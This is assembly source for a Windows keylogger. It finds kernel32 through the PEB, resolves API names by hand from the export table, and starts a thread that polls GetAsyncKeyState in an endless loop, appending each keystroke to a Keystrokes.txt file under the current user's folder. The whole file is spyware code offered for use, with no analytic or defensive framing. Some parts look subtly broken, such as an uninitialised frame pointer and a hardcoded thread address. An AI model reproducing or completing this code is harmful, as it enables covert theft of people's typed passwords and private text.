format PE GUI
call CodeStart
CodeStart:
	mov ebx, [FS: 0x30]   ; get a pointer to the PEB
	mov ebx, [ebx + 0x0C]	; get PEB->Ldr
	mov ebx, [ebx + 0x14]	; get PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
	mov ebx, [ebx]	 ; 2nd Entry
	mov ebx, [ebx]	 ; 3rd Entry
	mov ebx, [ebx + 0x10]	; Get Kernel32 Base
	 mov [ebp+8] , ebx
	add ebx, [ebx+0x3C]	; Start of PE header
	mov ebx, [ebx+0x78]	; RVA of export dir
	add ebx, [ebp+8]  ; VA of export dir
	 mov [ebp+12] , ebx

	push 0
	push 'ss'
	push 'ddre'
	push 'rocA'
	push 'GetP'
	mov edx,esp
	push edx
	mov ecx,14
	call GetFunctionAddress
	 mov [ebp+24] , eax
	 push 0
	 push 'aryA'
	 push 'Libr'
	 push 'Load'
	 mov edx,esp
	push edx
	push dword [ebp+8]
	call eax
	 mov [ebp+28] , eax
	push 0
	push 'el32'
	push 'Kern'
	mov edx,esp
	push edx
	call dword[ebp+28]

	push 0
	push 'read'
	push 'teTh'
	push 'Crea'
	mov edx,esp
	push edx
	push eax
	mov ebx,[ebp+24]
	call ebx
	mov [ebp+32] , eax

MOV DWORD[EBP+60],0
LEA EBX,[ebp+60]
PUSH EBX
PUSH 0
PUSH 0
MOV EBX,004010D4h
PUSH EBX
PUSH 0
MOV DWORD[ebp+84],0
MOV DWORD[ebp+88],0
MOV DWORD[ebp+92],0
MOV EBX,[ebp+84]
PUSH EBX

;   lea rcx,[SECURITY_ATTRIBUTES_]

	call eax
OEP:
	jmp OEP
	db 0
	db 0
	db 0
	db 0
	db 0
	db 0
	db 0

KEYLOGGER:

sub esp,1000h
mov ebx, [FS: 0x30]   ; get a pointer to the PEB
	mov ebx, [ebx + 0x0C]	; get PEB->Ldr
	mov ebx, [ebx + 0x14]	; get PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
	mov ebx, [ebx]	 ; 2nd Entry
	mov ebx, [ebx]	 ; 3rd Entry
	mov ebx, [ebx + 0x10]	; Get Kernel32 Base
;	 mov [dwKernelBase] , ebx
	 mov [ebp+8] , ebx
	add ebx, [ebx+0x3C]	; Start of PE header
	mov ebx, [ebx+0x78]	; RVA of export dir
;	 add ebx, [dwKernelBase]  ; VA of export dir
	add ebx, [ebp+8]  ; VA of export dir
;	 mov [dwExportDirectory] , ebx
	 mov [ebp+12] , ebx

;	 lea edx,[api_GetProcAddress]
	;lea edx,[ebp+16]
	push 0
	push 'ss'
	push 'ddre'
	push 'rocA'
	push 'GetP'
	mov edx,esp
	push edx
	mov ecx,14
	call GetFunctionAddress
;	 mov [AGetProcAddressA] , eax
	 mov [ebp-24] , eax
;	 lea edx,[api_LoadLibrary]
	 push 0
	 push 'aryA'
	 push 'Libr'
	 push 'Load'
	 mov edx,esp
	push edx
	push dword [ebp+8]
	call eax
;	 mov [ALoadLibraryA] , eax
	 mov [ebp-28] , eax
	push 0
	push 'el32'
	push 'Kern'
	mov edx,esp
	push edx
	call dword[ebp-28]


	push 0
	push '32'
	push 'User'
	mov edx,esp
	push edx
	call dword[ebp-28]


	push 0
	push 'tate'
	push 'KeyS'
	push 'sync'
	push 'GetA'
	mov edx,esp
	push edx
	push eax
	mov ebx,[ebp-24]
	call ebx
	mov [ebp-40] , eax


	push 0
	push 'rt'
	push 'msvc'
	mov edx,esp
	push edx
	call dword[ebp-28]

	push 0
	push 'n'
	push 'fope'
	mov edx,esp
	push edx
	push eax
	mov ebx,[ebp-24]
	call ebx
	mov [ebp-44] , eax

	push 0
	push 'rt'
	push 'msvc'
	mov edx,esp
	push edx
	call dword[ebp-28]

	push 0
	push 'te'
	push 'fwri'
	mov edx,esp
	push edx
	push eax
	mov ebx,[ebp-24]
	call ebx
	mov [ebp-52] , eax

	push 0
	push 'rt'
	push 'msvc'
	mov edx,esp
	push edx
	call dword[ebp-28]
	push 'se'
	push 'fclo'
	mov edx,esp
	push edx
	push eax
	call dword[ebp-24]
	mov [ebp-56],eax

	push 0
	push 'rt'
	push 'msvc'
	mov edx,esp
	push edx
	call dword[ebp-28]
	push 'at'
	push 'strc'
	mov edx,esp
	push edx
	push eax
	call dword[ebp-24]
	mov [ebp-60],eax

	push 0
	push 'pi32'
	push 'Adva'
	mov edx,esp
	push edx
	call dword[ebp-28]
	mov [ebp-64],eax

	push 0
	push 'ameA'
	push 'serN'
	push 'GetU'
	mov edx,esp
	push edx
	push eax
	mov ebx,[ebp-24]
	call ebx
	mov [ebp-32] , eax

	mov dword[ebp-84h],255
	lea  ebx,[ebp-84h]
	push ebx
	lea ebx,[ebp+8]
	push ebx
	call eax

	push 0
	push 'rt'
	push 'msvc'
	mov edx,esp
	push edx
	call dword[ebp-28]

	push 'at'
	push 'strc'
	mov edx,esp
	push edx
	push eax
	mov ebx,[ebp-24]
	call ebx
	mov [ebp-36] , eax
	

	push 0
	push "\"
	push "sers"
	push "C:\U"
	mov ebx,esp
	lea edx,[ebp+8]
	push edx
	push ebx
	call eax



	push 0
	push "txt"
	push "kes."
	push "stro"
	push "\Key"
	mov ebx,esp
	push ebx
	push eax
	call dword[ebp-36]
	mov [ebp-120],eax

	L1:
	mov esi,8
	L2:
	cmp esi,255
	jz L0
	push esi
	call dword[ebp-40]
	cmp ax,-32767
	jz foundkeystroke
	inc esi
	jmp L2
	L0:
	mov esi,8
	jmp L1
	foundkeystroke:
	mov eax,esi
	mov [ebp-112],eax

	MOV DWORD[EBP-7Ch],'a'
	LEA EDX,[EBP-7Ch]
	PUSH EDX
	;SUB ESP,4
	MOV EDX,[EBP-120]
	PUSH EDX
	call dword[ebp-44]
	mov [ebp-116],eax
	push eax
	push 1
	push 1
	LEA EDX,[ebp-112]
	PUSH EDX
	call dword[ebp-52]
	push dword[ebp-116]
	call dword[ebp-56]
	JMP L1		;LOOP INFINITO DO KEYLOGGER
	retn



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;	  <<<<< GetFunctionAddress >>>>>>											;
;	 Extracts Function Address From Export Directory and returns it in eax		;
;	 Parameters :  Function name in edx , Length in ecx						  ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

GetFunctionAddress:
       ; push ebp
       ; mov ebp,esp

	mov esi, [ebp+12]
	mov esi, [esi+0x20]	;RVA of ENT
	add esi, [ebp+8]  ;VA of ENT
	xor ebx,ebx
	cld

	looper:
		  inc ebx
		  lodsd
		  add eax , [ebp+8]   ;eax now points to the string of a function
		  push esi		;preserve it for the outer loop
		  mov esi,eax
		  mov edi,edx
		  cld
		  push ecx
		  repe cmpsb
		  pop ecx
		  pop esi
		  jne looper

		  dec ebx
		  mov eax,[ebp+12]
		  mov eax,[eax+0x24]	   ;RVA of EOT
		  add eax,[ebp+8]     ;VA of EOT
		  movzx eax , word [ebx*2+eax]	;eax now holds the ordinal of our function
		  mov ebx,[ebp+12]
		  mov ebx,[ebx+0x1C]	   ;RVA of EAT
		  add ebx,[ebp+8]     ;VA of EAT
		  mov ebx,[eax*4+ebx]
		  add ebx,[ebp+8]
		  mov eax,ebx

	       ; pop ebp
		ret
